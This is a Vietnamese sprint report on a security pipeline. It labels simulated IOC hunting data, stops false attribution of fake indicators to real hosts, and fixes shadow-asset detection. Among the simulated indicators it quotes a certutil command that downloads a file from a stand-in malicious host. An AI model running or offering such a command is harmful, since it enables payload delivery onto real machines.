# IOC ATTRIBUTION & SHADOW ASSET PIPELINE

**Sprint**: 6.1
**Ngày**: 2026-09-13
**Trạng thái**: LOCKED

Sprint 5 để lại hai lỗ hổng đã ghi nhận nhưng chưa sửa:

1. Correlation Rule 1 luôn trả 0 vì IOC từ hunting không mang IP.
2. `shadow_asset_detector.py` không nằm trong pipeline — `state/shadow_assets.json`
   đứng yên từ 2026-09-09.

Sprint 6.1 xử lý cả hai. Nhưng kết quả không phải là "Rule 1 giờ đã chạy" — mà là
một điều quan trọng hơn.

---

## 1. Phát hiện chặn đường: IOC hunting là dữ liệu mô phỏng

Cả bốn script hunting đều tự khai điều này trong mã nguồn:

```python
# Simulate: Phát hiện các chỉ báo credential dumping
# (Trong production, sẽ call MCP huntCredentialDumping)
```

Các chỉ báo như `LSASS Memory Access`, `Mimikatz Activity`,
`certutil.exe -urlcache -f http://malicious.com/file.exe` là **hằng số viết cứng
trong script**, không phải quan sát từ máy thật.

`affected_systems: []` vì thế không phải lỗi thiếu sót. Không có gì để quy kết.

### Vì sao không "vá" bằng cách điền IP vào

`hunt_lateral_movement.py` từng làm đúng chuyện đó:

```python
'affected_assets': ['192.168.0.1', '192.168.0.10']   # đã gỡ ở Sprint 6.1
```

Hai IP này có thật trong kho tài sản. Hệ quả dây chuyền ở Sprint 5: correlation
engine nâng chúng thành **2 executive finding mức HIGH**, risk engine cộng điểm,
Telegram sẵn sàng bắn cảnh báo, và khuyến nghị là *"Cô lập khỏi mạng ngay"* — cho
hai thiết bị hoàn toàn bình thường.

> Quy kết một IOC giả vào một IP thật không tạo ra thông tin. Nó tạo ra bằng
> chứng giả, và bằng chứng giả thì đắt hơn không có gì.

---

## 2. Hợp đồng attribution (`scripts/ioc_attribution.py`)

Tách bạch hai khái niệm trước nay bị trộn:

| Trường | Nghĩa | Khi nào điền |
|---|---|---|
| `hunt_scope` | Cuộc săn đã **chạy trên** những máy nào | Luôn — đây là sự thật |
| `affected_systems` | Bằng chứng **trỏ về** máy nào | Chỉ khi bằng chứng có thật |

Mỗi chỉ báo nay mang:

```json
{
  "data_source": "SIMULATED",
  "affected_systems": [],
  "attribution": {"method": "none", "confidence": "NONE", "reason": "..."},
  "hunt_scope": ["192.168.0.1", "192.168.0.21", "192.168.0.233"]
}
```

`data_source` có ba giá trị: `SIMULATED`, `DERIVED` (suy ra từ state file thật),
`OBSERVED` (đọc trực tiếp telemetry).

`attribute()` **cưỡng chế** `affected_systems = []` khi nguồn là `SIMULATED`. Gọi
sai hàm cũng không tạo ra được quy kết giả.

`hunt_scope` lấy từ `state/assets.json` giao với `arp -a` thật — đây là dữ liệu
quan sát được, kể cả khi chỉ báo thì không.

---

## 3. Hạ nguồn: nhãn đi theo con số tới mọi nơi

Gắn nhãn mà không truyền đi thì vô dụng. Bốn tầng tiêu thụ đều đã sửa:

| Tầng | Trước Sprint 6.1 | Sau |
|---|---|---|
| `correlation_engine.py` | Rule 1/2 quét IP trong toàn bộ dict chỉ báo | Chỉ báo `SIMULATED` không sinh quy kết; finding mang `evidence_quality` |
| `calculate_risk_score.py` | 25% trọng số từ hunting, không chú thích | `factors[].detail` gắn `[MÔ PHỎNG]`, `notes` cảnh báo rõ |
| `generate_daily_brief.py` | — | Nhận cảnh báo qua `notes` (đã đọc `risk_score.json` từ Sprint 6) |
| `auto_investigation_playbook.py` | Case ghi "Mimikatz Activity" + "Ngắt mạng" | `evidence_quality`, tin Telegram thêm dòng ⚠️ |

### Một cái bẫy suýt tự tạo ra

Thêm `hunt_scope` vào chỉ báo gần như đã gây ra thảm hoạ. `indicator_ips()` của
correlation engine quét **toàn bộ** dict tìm IPv4:

```python
ips |= extract_ips(indicator)     # quét cả dict
```

Nghĩa là ba IP trong `hunt_scope` sẽ trở thành "bằng chứng" cho **mọi** chỉ báo mô
phỏng — nhân bản đúng cái sai mà sprint này sinh ra để diệt, nhưng ở quy mô lớn
hơn nhiều. Hàm nay bỏ qua `SCOPE_FIELDS` và trả về rỗng cho chỉ báo mô phỏng.

---

## 4. Shadow Asset Pipeline

### Vì sao bản cũ không thể chạy

| Lỗi | Chi tiết |
|---|---|
| Sai khoá | Đọc `assets.json['all_assets']`; tệp sống dùng `assets` — **đúng lỗi đã giết `risk_engine.py`** |
| Sai nguồn MAC | Lấy `mac` từ `assets.json`, nơi không hề có trường đó |
| Writer thứ hai | `open(assets_file,'w')` không atomic — tự biến mình thành writer thứ hai của `assets.json` |

### Bản mới (`detector_version` 2.0.0)

Nguồn MAC là `arp -a` thật. Chỉ ghi `shadow_assets.json`, atomic. **Không bao giờ
ghi `assets.json`.**

Hai loại shadow, vì hai loại đòi hai hành động khác nhau:

| Loại | Nghĩa | Mức |
|---|---|---|
| `UNKNOWN_DEVICE` | ARP thấy, kho tài sản không có → thiết bị lạ trong mạng | HIGH |
| `UNVERIFIED_L2` | Kho có, ARP không thấy → không xác minh được ở lớp 2 | LOW |

Bản cũ gắn cờ cả hai như nhau. Loại thứ hai thường chỉ là **máy đang tắt**, nên để
ở HIGH là tự tạo nhiễu. Mảng `shadows` chỉ chứa loại thứ nhất — đó là mảng mà
correlation engine và portal đọc; loại thứ hai nằm riêng ở `unverified_assets`.

### Kết quả trên dữ liệu thật

```
total_assets: 11 | arp_devices_seen: 3 | shadows_detected: 0 | unverified: 8
```

**0 thiết bị lạ.** Con số cũ (2 shadow) sinh từ schema chết.

Đã kiểm chứng nhánh `UNKNOWN_DEVICE` không phải mã chết: chèn `192.168.0.99` vào
bảng ARP trong fixture → phát hiện đúng 1 shadow HIGH, không báo nhầm IP đã biết,
tệp state thật không bị đụng.

Pipeline: chạy ở **Phase 2, ngay sau Asset Intelligence** — cần kho tài sản vừa
dựng, và là đầu vào của correlation Rule 1 ở Phase 10.

---

## 5. Vì sao Rule 1 vẫn trả 0 — và vì sao đó là kết quả đúng

```
GAP RULE-1 NO_SHADOW_ASSETS   → mạng thật không có thiết bị lạ nào
GAP RULE-1 IOC_SIMULATED      → (hiện khi có shadow) IOC là dữ liệu mô phỏng
```

Rule 1 cần **shadow asset** ∩ **IOC quy kết được**. Hiện tại vế đầu = 0 (thật), vế
sau = 0 (mô phỏng). Cả hai vế đều được ghi lý do rõ ràng thay vì im lặng.

Executive findings trước/sau:

| | Sprint 5 | Sprint 6.1 |
|---|---|---|
| Findings | 2 × **HIGH**, quy kết `192.168.0.1` và `192.168.0.10` | 1 × **INFO**, không quy kết thiết bị |
| Nguồn | IP hardcode trong script hunting | `evidence_quality: SIMULATED` |

---

## 6. Điều Sprint 6.1 KHÔNG làm

1. **Không đổi cách chấm điểm rủi ro.** Hunting vẫn giữ 25% trọng số và 14 phát
   hiện CRITICAL vẫn kích hoạt severity floor, dù toàn bộ là mô phỏng. Gắn nhãn là
   việc của sprint này; đổi trọng số là quyết định chính sách, không nên là hệ quả
   âm thầm của việc gắn nhãn. Điểm vẫn là **56 / HIGH**.

2. **Không nối hunting với MCP tool thật.** Đó là thay đổi kiến trúc: pipeline là
   Python, các tool hunting nằm sau MCP server Node. Cần một sprint riêng.

3. **`assets.json` vẫn có hai producer.** `asset_builder.py` ghi `all_assets`,
   `scripts/extract_asset_intelligence.py` ghi `assets`. `ioc_attribution.py` và
   shadow detector đọc được cả hai, nhưng gốc rễ chưa được dọn.
